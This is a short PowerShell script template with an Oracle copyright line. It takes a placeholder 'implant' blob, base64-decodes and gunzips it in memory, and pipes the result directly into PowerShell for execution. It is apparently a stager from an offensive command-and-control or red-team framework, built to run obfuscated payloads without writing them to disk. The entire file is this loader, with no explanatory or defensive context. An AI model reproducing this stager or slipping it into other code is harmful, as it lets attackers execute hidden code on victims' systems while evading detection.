# Copyright (c) 2024, Oracle and/or its affiliates.
$data = '{{ implantBlob }}';
$archive = [System.Convert]::FromBase64String($data);
$zipBuffer = New-Object System.IO.MemoryStream(,$archive);
$outBuffer = New-Object System.IO.MemoryStream;
$GZIPobject = New-Object System.IO.Compression.GzipStream $zipBuffer, ([IO.Compression.CompressionMode]::Decompress);
$GZIPobject.CopyTo($outBuffer);
$GZIPobject.Close();
$zipBuffer.Close();
[byte[]] $payloadBytes = $outBuffer.ToArray();
$payloadString = [System.Text.Encoding]::UTF8.GetString($payloadBytes);
$payloadString | powershell -

